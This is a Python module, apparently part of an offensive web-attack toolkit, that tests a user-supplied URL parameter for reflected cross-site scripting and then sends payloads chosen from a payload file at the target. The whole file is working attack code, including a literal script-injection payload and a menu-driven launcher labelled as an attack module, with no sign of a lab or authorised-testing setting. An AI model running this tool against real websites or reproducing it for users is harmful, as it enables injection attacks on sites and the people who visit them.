# web_apps/xss.py
import requests

# File containing XSS payloads
XSS_PAYLOAD_FILE = "web_apps/payloads/xss_payloads.txt"

def check_xss_vulnerability(url, param):
    """Check if a web application is vulnerable to XSS."""
    test_payload = "<script>alert('XSS')</script>"
    response = requests.get(url, params={param: test_payload})

    if test_payload in response.text:
        print(f"[+] The website is vulnerable to XSS! ({url})")
        return True
    else:
        print("[-] No XSS vulnerability detected.")
        return False

def load_payloads():
    """Load XSS payloads from a file."""
    try:
        with open(XSS_PAYLOAD_FILE, "r") as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print("[-] XSS payload file not found!")
        return []

def exploit_xss(url, param):
    """Allow the user to select and run different XSS payloads."""
    payloads = load_payloads()
    if not payloads:
        return

    print("\n[+] Available XSS Payloads:")
    for i, payload in enumerate(payloads, start=1):
        print(f"{i}) {payload}")

    choice = input("\nSelect a payload number to use: ")
    try:
        selected_payload = payloads[int(choice) - 1]
        response = requests.get(url, params={param: selected_payload})
        print(f"[+] XSS Payload Sent: {selected_payload}")
        print("[*] Check the target website for execution.")
    except (IndexError, ValueError):
        print("[-] Invalid choice!")

def xss_attack():
    """Main function for XSS attack module."""
    url = input("Enter the target URL: ")
    param = input("Enter the parameter to test (e.g., search, q, input): ")

    if check_xss_vulnerability(url, param):
        exploit_xss(url, param)
